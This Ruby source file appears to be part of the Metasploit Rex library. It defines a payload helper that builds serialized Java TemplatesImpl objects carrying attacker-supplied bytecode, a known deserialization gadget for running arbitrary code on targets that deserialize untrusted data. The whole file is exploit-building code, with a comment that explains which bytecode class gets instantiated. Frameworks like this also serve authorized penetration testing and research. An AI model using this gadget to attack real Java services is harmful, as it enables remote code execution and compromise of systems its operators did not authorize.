# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class Templates
          # one of the passed bytecodes needs to extend
          # com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
          # That class is the one that will be instantiated
          def self.make_jdk(bytecodes)
            bcs = Model::JavaArray.new('[B', bytecodes.map { 
              |bytecode| Model::JavaArray.new('B', bytecode[1].bytes.to_a) 
            })
            tpl = Model::JavaObject.new('Lcom/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl;', 
                                        '_outputProperties' => Model::JavaObject.new('Ljava/util/Properties;', {}),
                                        '_name' => 'Translet',
                                        '_bytecodes' => bcs)
            tpl
          end

          def self.make_xalan(bytecodes)
            bcs = Model::JavaArray.new('[B', bytecodes.map { 
              |bytecode| Model::JavaArray.new('B', bytecode[1].bytes.to_a) 
            })
            tpl = Model::JavaObject.new('Lorg/apache/xalan/xsltc/trax/TemplatesImpl;', 
                                        '_outputProperties' => Model::JavaObject.new('Ljava/util/Properties;', {}),
                                        '_name' => 'Translet',
                                        '_bytecodes' => bcs)
            tpl
          end
        end
      end
    end
  end
end
